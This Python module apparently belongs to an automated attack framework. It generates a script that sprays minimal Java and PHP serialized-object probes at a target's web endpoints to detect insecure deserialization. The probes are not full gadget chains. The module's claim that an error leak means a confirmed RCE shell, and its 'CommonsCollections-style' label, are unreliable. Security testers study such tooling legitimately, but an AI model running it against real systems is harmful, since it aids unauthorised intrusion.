"""Attack modules: deserialize."""

from __future__ import annotations

from typing import Any

from tools.attack_modules.base import AttackModule, ModuleContext


class DeserializeAttack(AttackModule):
    name = "DeserializeAttack"
    description = "Java/PHP/.NET deserialization payload generation and injection"
    target_services = ["http", "https"]
    target_ports = [80, 443, 8080, 8443, 3000, 5000]
    required_cves = []
    # Capability metadata: a confirmed gadget-chain deserialization yields
    # remote code execution = shell. No prerequisite artifacts.
    requires: list[str] = []
    produces: list[str] = ["shell"]
    read_only = False
    cost = "high"
    phase_hint = "exploit"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": (
                "Tests for Java (ysoserial-style), PHP, and .NET deserialization "
                "vulnerabilities. On a confirmed deserialization error leak the "
                "orchestrator sets status=success with shell_type=rce (advisory -- "
                "the gadget chain is realizable via ysoserial/phpggc)."
            ),
            "evidence": [f"deserialization probes queued against {ctx.target_ip}"],
            "references": [
                "https://nvd.nist.gov/vuln/detail/CVE-2015-4852",
                "https://nvd.nist.gov/vuln/detail/CVE-2017-7525",
                "https://portswigger.net/web-security/deserialization",
            ],
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f'''"""Deserialization Attack Probe — Java/PHP/.NET payload injection."""
import base64, hashlib, json, struct, sys, urllib.request, urllib.parse, urllib.error

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 80
SCHEME = "https" if PORT in (443, 8443) else "http"
BASE = f"{{SCHEME}}://{{TARGET}}:{{PORT}}"

# Java serialization magic bytes
JAVA_MAGIC = bytes([0xac, 0xed, 0x00, 0x05])

# PHP serialization patterns
PHP_PATTERNS = ['O:', 'a:', 's:', 'i:', 'd:', 'b:', 'N;', 'C:', 'O+']

# .NET serialization markers
DOTNET_MARKERS = [
    b"\\x00\\x01\\x00\\x00\\x00\\xff\\xff\\xff\\xff",  # BinaryFormatter
    b"<SOAP-ENV:",  # SOAP
    b"<?xml",       # XML-based
]

def generate_java_gadget(command: str = "id") -> bytes:
    """Generate a minimal Java deserialization gadget (CommonsCollections-style)."""
    # This is a simplified probe — real ysoserial payloads are much larger
    cmd_bytes = command.encode()
    payload = JAVA_MAGIC
    # Minimal TC_OBJECT + TC_CLASSDESC structure
    payload += bytes([0x73])  # TC_OBJECT
    payload += bytes([0x72])  # TC_CLASSDESC
    # Class name: "Probe"
    name = "Probe".encode()
    payload += struct.pack(">H", len(name)) + name
    # Serial version UID
    payload += struct.pack(">q", 0)
    # Flags: SC_SERIALIZABLE
    payload += bytes([0x02])
    # Field count: 0
    payload += struct.pack(">H", 0)
    # No class annotations, no super class
    payload += bytes([0x78])  # TC_ENDBLOCKDATA
    payload += bytes([0x70])  # TC_NULL (no super class)
    return payload

def generate_php_gadget(class_name: str = "SplObjectStorage") -> str:
    """Generate a PHP deserialization gadget string."""
    return f'O:{{len(class_name)}}:"{{class_name}}":0:{{{{}}}}'

def probe_java_deserialize(url: str, param: str = "data") -> dict:
    """Test for Java deserialization."""
    gadget = generate_java_gadget()
    encoded = base64.b64encode(gadget).decode()
    results = {{}}

    # Test base64-encoded
    try:
        test_url = f"{{url}}?{{param}}={{urllib.parse.quote(encoded)}}"
        req = urllib.request.Request(test_url)
        with urllib.request.urlopen(req, timeout=8) as resp:
            body = resp.read(4096).decode(errors="replace")
            results["base64_response"] = body[:500]
    except urllib.error.HTTPError as e:
        body = e.read().decode(errors="replace")
        if "ClassNotFoundException" in body or "InvalidClassException" in body:
            results["java_detected"] = True
            results["error_class"] = body[:300]
        elif "deserialize" in body.lower() or "unserialize" in body.lower():
            results["deserialization_error"] = body[:300]
    except Exception as e:
        results["error"] = str(e)

    # Test raw bytes in body
    try:
        req = urllib.request.Request(
            f"{{url}}",
            data=gadget,
            headers={{"Content-Type": "application/octet-stream"}},
            method="POST",
        )
        with urllib.request.urlopen(req, timeout=8) as resp:
            results["raw_response"] = resp.status
    except urllib.error.HTTPError as e:
        results["raw_error_code"] = e.code
    except Exception:
        pass

    return results

def probe_php_deserialize(url: str, param: str = "data") -> dict:
    """Test for PHP deserialization."""
    results = {{}}
    for cls in ["SplObjectStorage", "ArrayObject", "Exception"]:
        gadget = generate_php_gadget(cls)
        try:
            test_url = f"{{url}}?{{param}}={{urllib.parse.quote(gadget)}}"
            req = urllib.request.Request(test_url)
            with urllib.request.urlopen(req, timeout=8) as resp:
                body = resp.read(4096).decode(errors="replace")
                results[f"{{cls}}_response"] = body[:300]
        except urllib.error.HTTPError as e:
            body = e.read().decode(errors="replace")
            if "unserialize" in body.lower() or "deserialize" in body.lower():
                results["php_detected"] = True
                results["php_error"] = body[:300]
        except Exception:
            pass
    return results

# Test endpoints
endpoints = ["/", "/api", "/rpc", "/soap", "/ws", "/service", "/deserialize", "/unserialize"]
params = ["data", "payload", "object", "state", "serialized", "input", "body"]

print(f"=== Deserialization Attack Probe: {{BASE}} ===\\n")

for ep in endpoints:
    for param in params:
        print(f"\\nProbing {{ep}}?{{param}}=...")
        java_results = probe_java_deserialize(f"{{BASE}}{{ep}}", param)
        if java_results:
            print(f"  Java: {{json.dumps(java_results, indent=2)[:400]}}")

        php_results = probe_php_deserialize(f"{{BASE}}{{ep}}", param)
        if php_results:
            print(f"  PHP: {{json.dumps(php_results, indent=2)[:400]}}")

print("\\n[!] For full exploitation, use ysoserial (Java) or phpggc (PHP) to generate proper gadget chains.")
'''

